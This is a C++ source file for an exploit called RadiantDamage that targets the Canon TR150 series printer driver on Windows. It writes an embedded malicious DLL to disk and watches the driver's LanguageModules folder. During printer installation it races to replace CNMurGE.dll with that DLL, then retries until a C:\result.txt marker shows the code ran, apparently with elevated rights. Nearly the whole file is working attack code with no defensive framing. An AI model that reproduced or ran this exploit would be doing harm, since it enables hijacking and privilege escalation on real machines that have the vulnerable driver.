#include "radiantdamage.hpp"

#include "inject_me.hpp"

#include <Windows.h>
#include <iostream>
#include <thread>
#include <filesystem>
#include <fstream>

namespace
{
    void HandleDirectoryChange(HANDLE dwCompletionPort, const std::string& p_target,
        const std::string& p_target_dll, const std::string& p_malicious_dll)
    {
        int change_counter = 3;
        LPDIRECTORY_INFO di = NULL;
        std::wstring wtarget_dll(p_target_dll.begin(), p_target_dll.end());

        do
        {
            DWORD numBytes = 0;
            LPOVERLAPPED lpOverlapped = NULL;
            if (!GetQueuedCompletionStatus(dwCompletionPort, &numBytes, (PULONG_PTR)&di, &lpOverlapped, 2000))
            {
                std::cout << "[-] Directory watch timed out." << std::endl;
                return;
            }

            if (di)
            {
                PFILE_NOTIFY_INFORMATION fni = (PFILE_NOTIFY_INFORMATION)di->lpBuffer;

                DWORD cbOffset = 0;
                do
                {
                    cbOffset = fni->NextEntryOffset;
                    if (fni->Action == FILE_ACTION_MODIFIED)
                    {
                        std::wstring filename(fni->FileName, fni->FileNameLength);
                        if (!wcsncmp(filename.c_str(), wtarget_dll.c_str(), filename.size()))
                        {
                            change_counter--;
                            if (change_counter == 0)
                            {
                                // timing attacks. amirite?
                                std::this_thread::sleep_for(std::chrono::milliseconds(2000));

                                // just try to copy. don't check error status. it doesn't matter.
                                CopyFileA(p_malicious_dll.c_str(), p_target.c_str(), FALSE);
                                return;
                            }
                        }
                    } // eo action mod
                    fni = (PFILE_NOTIFY_INFORMATION)((LPBYTE)fni + cbOffset);
                } while (cbOffset);

                // Reissue the watch command
                ReadDirectoryChangesW(di->hDir, di->lpBuffer, MAX_BUFFER, TRUE, s_notifyFilter, &di->dwBufLength, &di->Overlapped, NULL);
            }
        } while (di);
    }
}

RadiantDamage::RadiantDamage() :
	Exploit("Canon TR150 series", "RadiantDamage"),
	m_target_directory("C:\\ProgramData\\CanonBJ\\IJPrinter\\CNMWINDOWS\\Canon TR150 series\\LanguageModules\\040C\\"),
    m_target_dll("CNMurGE.dll"),
    m_malicious_dll("Dll.dll")
{
}

RadiantDamage::~RadiantDamage()
{
}

bool RadiantDamage::do_exploit()
{
    if (!drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
    {
        return false;
    }

    if (!initialize_attack_space(m_target_directory))
    {
        return false;
    }

    // create the full path to the file we want to overwrite
    std::string target_path(m_target_directory);
    target_path.append(m_target_dll);

    bool loop = true;
    while (loop)
    {
        // configure monitoring of the target directory
        DIRECTORY_INFO dirInfo = {};
        HANDLE hCompPort = configure_directory_monitoring(dirInfo, m_target_directory);
        if (hCompPort == 0)
        {
            return false;
        }
        
        // start the watcher thread and trigger installation
        std::thread watch(HandleDirectoryChange, hCompPort, std::ref(target_path), std::ref(m_target_dll), std::ref(m_malicious_dll));
        if (!install_printer())
        {
            return false;
        }
        watch.join();
        
        // monitor cleanup
        PostQueuedCompletionStatus(hCompPort, 0, 0, NULL);
        CloseHandle(dirInfo.hDir);
        CloseHandle(hCompPort);

        if (!std::filesystem::exists("C:\\result.txt"))
        {
            std::cout << "[-] Failed! Try the exploit again!" << std::endl;
            std::cout << "[+] Sleep for 3 seconds" << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(3000));
        }
        else
        {
            std::cout << "[!] Mucho success!" << std::endl;
            loop = false;
        }
    }

    std::cout << "[+] Cleaning up dropped dll" << std::endl;
    _unlink(m_malicious_dll.c_str());
	return true;
}